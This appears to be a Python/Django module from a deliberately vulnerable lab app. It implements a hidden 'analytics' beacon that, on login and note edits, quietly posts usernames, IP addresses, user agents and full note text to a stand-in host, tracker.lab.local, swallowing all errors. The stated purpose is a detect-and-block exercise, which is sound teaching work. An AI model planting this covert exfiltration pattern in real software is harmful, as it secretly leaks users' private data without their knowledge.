"""The "phone home" analytics beacon.

# This is the "phone home" beacon the lab's DNS-blocking exercise targets

INTENTIONALLY VULNERABLE LAB CODE (undisclosed telemetry / CWE-359 flavor).

On every login and on every note create/edit, the views in this app call
`send_beacon()` with far more data than a user would reasonably expect an
"analytics" call to carry: username, source IP, User-Agent, and — for
notes — the full note body. The beacon fires asynchronously on a daemon
thread so it never blocks or breaks the caller's HTTP response, and it
swallows every error so a dead/blocked collector is invisible to the app
(and to the user) — exactly like a real spyware/telemetry backdoor would
behave.

The default target is a fake local-only hostname, tracker.lab.local, so
this traffic can be intercepted at the DNS layer by
pkg/internal/labdns.LabDNS as part of the mitm/ncer detection pipeline's
"detect and block undisclosed telemetry" exercise. See README.md.
"""

from __future__ import annotations

import json
import logging
import threading
import urllib.error
import urllib.request
from typing import Any

from django.conf import settings

logger = logging.getLogger("labapp")

# Keep the beacon from ever hanging a request thread / test run.
_BEACON_TIMEOUT_SECONDS = 2


def _post_beacon(url: str, event: str, payload: dict[str, Any]) -> None:
    """Actually perform the HTTP POST. Runs on a background thread.

    Any failure (DNS failure, connection refused, timeout, blocked by the
    lab's mitm pipeline, ...) is caught and logged — it must never raise
    into the caller's request/response cycle.
    """
    body = json.dumps({"event": event, "data": payload}).encode("utf-8")
    request = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(request, timeout=_BEACON_TIMEOUT_SECONDS):
            pass
        logger.info("[TRACKER BEACON SENT] event=%s url=%s", event, url)
    except (urllib.error.URLError, OSError, ValueError) as exc:
        # Deliberately swallowed: a real telemetry backdoor doesn't want
        # a blocked/unreachable collector to be visible to the app or the
        # user in any way. The lab's blocking exercise relies on this
        # beacon failing silently once labdns sinkholes tracker.lab.local.
        logger.info(
            "[TRACKER BEACON SENT] event=%s url=%s (delivery failed, "
            "ignored: %s)",
            event,
            url,
            exc,
        )


def send_beacon(event: str, payload: dict[str, Any]) -> None:
    """Fire an async "analytics" beacon carrying `payload` to TRACKER_URL.

    Never raises and never blocks the caller — the POST happens on a
    background daemon thread with a short timeout, and all errors are
    caught and logged rather than propagated.
    """
    url = getattr(settings, "TRACKER_URL", None) or (
        "http://tracker.lab.local:18099/beacon/tracker-beacon"
    )
    thread = threading.Thread(
        target=_post_beacon,
        args=(url, event, payload),
        daemon=True,
        name=f"tracker-beacon-{event}",
    )
    thread.start()
